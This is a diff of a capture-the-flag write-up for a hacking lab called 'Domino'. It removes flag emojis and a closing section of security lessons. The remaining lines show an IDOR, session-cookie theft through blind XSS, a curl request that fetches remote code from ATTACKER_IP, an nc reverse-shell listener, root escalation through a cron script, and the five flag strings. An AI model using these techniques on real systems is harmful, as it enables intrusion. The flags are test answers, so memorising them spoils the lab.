@@ -235,7 +235,7 @@ Welcome, laura.hayes
 Role: admin
 ```
  
-**🚩 Flag 1** — a separate IDOR was also present the whole time: `/api/users/profile.php?id=1`, reachable with *any* authenticated session (no ownership check on the `id` parameter), leaks Laura's `notes` field directly:
+** Flag 1** — a separate IDOR was also present the whole time: `/api/users/profile.php?id=1`, reachable with *any* authenticated session (no ownership check on the `id` parameter), leaks Laura's `notes` field directly:
  
 ```json
 {"id":1,"username":"laura.hayes","role":"admin","notes":"THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"}
@@ -249,7 +249,7 @@ Role: admin
  
 causes the bot to extract and request that URL, forwarding its own session cookie in the process — handing over Laura's live, properly-signed `nexus_session` cookie directly. This also solves Flag 2 below without ever touching the AES key or JWT bug.
  
-**🚩 Flag 2** — the admin panel (`/admin/index.php`) displays it directly on login:
+** Flag 2** — the admin panel (`/admin/index.php`) displays it directly on login:
  
 ```
 THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
@@ -281,7 +281,7 @@ curl -s -H "Authorization: Bearer $TOKEN" \
   "http://target/api/files.php?name=http://ATTACKER_IP:8888/flag3.php"
 ```
  
-**🚩 Flag 3:**
+** Flag 3:**
 ```
 THM{rf1_2_rc3_f00th0ld_fl4g3}
 ```
@@ -320,7 +320,7 @@ devops@tryhackme:/opt$ id
 uid=1001(devops) ...
 ```
  
-**🚩 Flag 4** (devops home directory):
+** Flag 4** (devops home directory):
 ```
 THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
 ```
@@ -356,7 +356,7 @@ nc -lvnp 9999
 uid=0(root) gid=0(root) groups=0(root)
 ```
  
-**🚩 Flag 5 (root):**
+** Flag 5 (root):**
 ```
 THM{pr1v3sc_cr0n_r00t_fl4g5}
 ```
@@ -379,17 +379,3 @@ THM{pr1v3sc_cr0n_r00t_fl4g5}
 | V10 | World-writable root cron script | Trivial privilege escalation to `root` |
  
 ---
- 
-## Key Takeaways
- 
-1. **Never ship secrets in frontend JavaScript** — not even "temporarily." The TODO comment in `app.js` said "move to env before prod deployment." It never happened, and it started the entire chain.
-2. **Signature verification exists for a reason.** A commented-out `hash_equals()` call turns a cryptographically signed token into base64-encoded wishful thinking. It doesn't matter how strong the actual secret is if the check itself never runs.
-3. **File-reading APIs need real path validation** — `realpath()` + an allow-list, not a prefix string match that can still be satisfied by attacker-controlled input.
-4. **`eval()` on remote content is never acceptable**, full stop. If you need remote configuration, parse it as data (JSON), never execute it as code.
-5. **IDOR checks matter on every object reference** — a `role: admin` gate on a *page* doesn't help if the *API* underneath has no per-object ownership check.
-6. **Automated bots that fetch user-supplied URLs need the same input hygiene as a browser rendering user content.** An "admin review" script that blindly requests any link it finds is SSRF and session-leak risk rolled into one.
-7. **Rotate secrets independently.** One DB password reused as an OS account password turned a single leak into full lateral movement.
-8. **Audit permissions on anything a root cron touches.** `find /etc/cron* /opt -type f -perm -o+w` (or group-writable, checked against the executing user) should be part of every hardening pass.
----
- 
-*Writeup for the "Domino" room — a great reminder that defense in depth means every layer has to hold, not just the one you're staring at.*
